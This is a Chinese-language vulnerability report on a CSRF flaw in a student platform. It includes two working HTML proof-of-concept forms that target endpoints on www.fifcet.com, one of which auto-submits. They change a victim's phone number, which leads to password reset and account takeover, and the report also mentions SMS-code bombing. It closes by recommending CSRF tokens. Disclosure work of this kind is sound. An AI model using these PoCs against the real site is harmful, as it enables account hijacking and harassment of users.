# XXX平台存在CSRF漏洞导致篡改手机号

## 1.漏洞详情

**在对XXX平台进行安全测试时，发现其平台存在 CSRF 漏洞，可执行多项敏感操作（包括篡改手机号，短信验证码轰炸，修改密码邮箱等）**

## 2.漏洞证明

**登录平台之后，模拟点击钓鱼链接test.com/poc1.html(发送新的手机验证码 poc)**

![image-20260524223911498](C:\Users\yexin\AppData\Roaming\Typora\typora-user-images\image-20260524223911498.png)

**poc1:**

**<html>**

  **<!-- CSRF PoC - generated by Burp Suite Professional -->**

  **<body>**

​    **<form action="https://www.fifcet.com/fif_cet_mgr/student/userInfo/sendValidateCode" method="POST">**

​      **<input type="hidden" name="mobile" value="yourphone" />**

​      **<input type="submit" value="Submit request" />**

​    **</form>**

    <script>

​      **history.pushState('', '', '/');**

​      **document.forms[0].submit();**

​    **</script>**

  **</body>**

**</html>**



**成功执行**

![image-20260524224008040](C:\Users\yexin\AppData\Roaming\Typora\typora-user-images\image-20260524224008040.png)

**把收到的验证码输入 test.com/poc2.html(模拟自动化输入验证码篡改手机号)**

## ![image-20260524224126957](C:\Users\yexin\AppData\Roaming\Typora\typora-user-images\image-20260524224126957.png)

**submit 之后，来看个人页面**

![image-20260524224318645](C:\Users\yexin\AppData\Roaming\Typora\typora-user-images\image-20260524224318645.png)

**刷新，成功篡改手机号**

![image-20260524224358402](C:\Users\yexin\AppData\Roaming\Typora\typora-user-images\image-20260524224358402.png)

**poc2:**

**<html>**

  **<body>**

​    **<form action="https://www.fifcet.com/fif_cet_mgr/student/userInfo/setMobile" method="POST">**

​      **<label for="mobile">手机号：</label>**

​      **<input type="text" id="mobile" name="mobile" value="yourphone" required />**

​      **<br><br>**

​      **<label for="validateCode">验证码：</label>**

​      **<input type="text" id="validateCode" name="validateCode" required />**

​      **<br><br>**

​      **<input type="submit" value="提交请求" />**

​    **</form>**

  **</body>**

**</html>**

**修改手机号之后，可以去登录界面去修改受害人的密码**

**![image-20260524224439563](C:\Users\yexin\AppData\Roaming\Typora\typora-user-images\image-20260524224439563.png)**

**进而登录受害人账号**



**由于本站还存在验证码轰炸漏洞，可以添加脚本对任意手机号进行无限短信轰炸**

**![image-20260524224502290](C:\Users\yexin\AppData\Roaming\Typora\typora-user-images\image-20260524224502290.png)**

**同理还可以 CSRF 对邮箱，密码等进行修改，危害大**

## **3.修复方案**

**添加 CSRF Token 验证**
